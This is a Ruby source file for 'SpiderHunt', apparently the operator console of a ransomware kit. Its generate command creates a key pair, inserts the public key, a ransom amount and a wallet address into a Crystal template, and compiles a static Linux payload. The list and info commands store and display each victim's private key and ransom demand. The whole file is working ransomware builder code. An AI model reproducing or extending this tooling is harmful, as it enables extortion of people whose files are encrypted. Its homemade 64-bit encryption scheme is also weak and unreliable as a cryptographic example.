require("openssl")
require("json")
require("readline")

class ASM
  def initialize()
    @keysize = 64 # Bits
    @keypair = {
      public: nil,
      private: nil,
    }
  end

  def generate()
    prime = OpenSSL::BN.generate_prime(@keysize).to_i
    privateKey = OpenSSL::BN.pseudo_rand_range(2 ** @keysize)
    publicKey = OpenSSL::BN.new(2).mod_exp(privateKey, OpenSSL::BN.new(prime)).to_i
    @keypair = {
      public: "#{publicKey}:#{prime}",
      private: "#{privateKey}:#{prime}",
    }
    return @keypair
  end

  def encrypt(msg, publicKey, pack: true)
    key, prime = publicKey.split(":").map(&:to_i)
    bytes = msg.bytes # Turn message into array of bytes
    encrypted = []
    bytes.each do |byte|
      encrypted.push(
        (byte * key) % prime
      )
    end
    packed = encrypted.pack("Q*").force_encoding("UTF-8")
    packed = packed.unpack1("H*") if pack
    return packed
  end

  def decrypt(msg, privateKey, pack: false)
    key, prime = privateKey.split(":").map(&:to_i)
    if pack
      packed = [msg].pack("H*")
      packed = packed.unpack("Q*")
    else
      packed = msg.unpack("Q*")
    end

    decrypted = []
    invert = modInverse(
      OpenSSL::BN.new(2).mod_exp(
        key,
        OpenSSL::BN.new(prime)
      ).to_i,
      prime
    )

    packed.each do |byte|
      decrypted.push(
        (byte * invert[0]) % prime

      )
    end
    decrypted.pack("C*")
  end

  def modInverse(a, b)
    # trivial case first: gcd(a, 0) == 1*a + 0*0
    return 1, 0 if b == 0

    # recurse: a = q*b + r
    q, r = a.divmod b
    s, t = modInverse(b, r)

    # compute and return coefficients:
    # gcd(a, b) == gcd(b, r) == s*b + t*r == s*b + t*(a - q*b)
    return t, s - q * t
  end
end

asem = ASM.new
keypairs = JSON.parse(File.read("keypairs.json"))

while line = Readline.readline("SpiderHunt> ", true)
  next if line.nil? || line.empty?
  args = line.split(" ")
  cmd = args[0]
  cmdArgs = {}
  args[1..].each do |arg|
    next unless arg.start_with?("--", "-")
    k, v = arg.split("=", 2)
    k = k[2..]
    cmdArgs[k] = v
  end
  puts("Command: #{cmd} arguments: #{cmdArgs}")
  case cmd
  when "list"
    puts("ID: DESC")
    keypairs.each do |k,v|
      puts("#{k} : #{v["desc"]}")
    end
    
  when "info"
    if !cmdArgs.key?("id")
      puts("Usage: info --id=<id>")
      next
    end
    if !keypairs.key?(cmdArgs["id"])
      puts("No session found with that ID")
    end

    i = keypairs[cmdArgs["id"]]
    puts("Private Key: #{i["private"]}")
    puts("Wallet: #{i["wallet"]}")
    puts("Ask Ammount: #{i["amount"]}")
    puts("Description: #{i['desc']}")
  when "generate"
    if !cmdArgs.key?("amount") || !cmdArgs.key?("wallet") || !cmdArgs.key?("desc")
      puts("Usage: generate --amount=200 --wallet=<some address> --desc=<Some description>")
      next
    end
    id = Random.new_seed
    keypair = asem.generate
    key, prime = keypair[:public].split(":")
    puts keypair
    code = File.read("big.cr")
    code.gsub!("{{public_key}}", "#{key}")
    code.gsub!("{{prime}}", "#{prime}")
    code.gsub!("{{amount}}", "#{cmdArgs["amount"]}")
    code.gsub!("{{wallet}}", "#{cmdArgs["wallet"]}")
    File.write("./new.cr", code)
    system("crystal build new.cr --static --target x86_64-unknown-linux-musl")
    puts("Payload generated!")
    File.delete("./new.cr")
    keypairs[id.to_s] = {
      "private": "#{keypair[:private]}",
      "wallet": "#{cmdArgs["wallet"]}",
      "amount": "#{cmdArgs["amount"]}",
      "desc": "#{cmdArgs["desc"]}"
    }
    File.write("keypairs.json", JSON.pretty_generate(keypairs))
  end
end

